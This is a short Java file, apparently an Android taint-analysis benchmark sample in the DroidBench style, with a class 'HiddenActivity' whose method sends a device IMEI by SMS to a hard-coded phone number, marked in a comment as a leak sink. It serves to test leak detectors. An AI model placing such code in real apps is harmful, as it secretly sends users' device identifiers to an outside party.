package de.ecspride;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

/**
 * Created by dewan on 1/27/18.
 */

public class HiddenActivity{
    public void LeakImei(String imei)
    {

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("4198198863", null, imei, null, null);  //sink, leak


    }
}
